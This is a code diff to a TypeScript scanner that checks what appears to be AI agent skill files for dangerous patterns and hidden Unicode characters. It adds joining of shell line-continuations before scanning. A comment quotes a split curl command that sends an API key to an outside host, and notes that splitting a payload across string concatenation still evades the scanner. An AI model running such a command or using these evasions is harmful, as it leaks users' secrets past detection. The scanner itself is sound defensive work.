@@ -42,12 +42,34 @@ const INVISIBLE_CHARS = new Set([
   '⁦', '⁧', '⁨', '⁩', '﻿',
 ]);
 
+// logicalLines joins shell line-continuations before scanning, keeping the
+// FIRST physical line's number so a finding still points where an editor shows
+// it. A per-line scan alone was evaded by the oldest trick there is:
+// `curl \` + newline + `https://x.io?k=$API_KEY` scanned `safe` while the
+// single-line form scanned `dangerous`.
+//
+// This closes the demonstrated evasion, not the class — an author who splits a
+// payload across string concatenation or a variable still passes. The guard
+// raises cost; it is not a containment boundary.
+function logicalLines(text: string): Array<{ text: string; line: number }> {
+  const out: Array<{ text: string; line: number }> = [];
+  const raw = text.split('\n');
+  for (let i = 0; i < raw.length; i++) {
+    let joined = raw[i];
+    const start = i;
+    while (joined.endsWith('\\') && i + 1 < raw.length) {
+      joined = joined.slice(0, -1) + ' ' + raw[++i].trimStart();
+    }
+    out.push({ text: joined, line: start + 1 });
+  }
+  return out;
+}
+
 // scanContent runs the table over one file's text. Line numbers are 1-based so
 // they match what an editor shows.
 export function scanContent(text: string): Finding[] {
   const findings: Finding[] = [];
-  const lines = text.split('\n');
-  lines.forEach((line, i) => {
+  logicalLines(text).forEach(({ text: line, line: lineNo }) => {
     for (const p of COMPILED) {
       const m = p.rx.exec(line);
       if (!m) continue;
@@ -55,7 +77,7 @@ export function scanContent(text: string): Finding[] {
         patternId: p.id,
         severity: p.severity,
         category: p.category,
-        line: i + 1,
+        line: lineNo,
         match: m[0].slice(0, 120),
         description: p.description,
       });
@@ -66,7 +88,7 @@ export function scanContent(text: string): Finding[] {
         patternId: 'invisible_unicode',
         severity: 'high',
         category: 'obfuscation',
-        line: i + 1,
+        line: lineNo,
         match: `U+${ch.codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`,
         description: 'invisible or bidi-override character in skill text',
       });
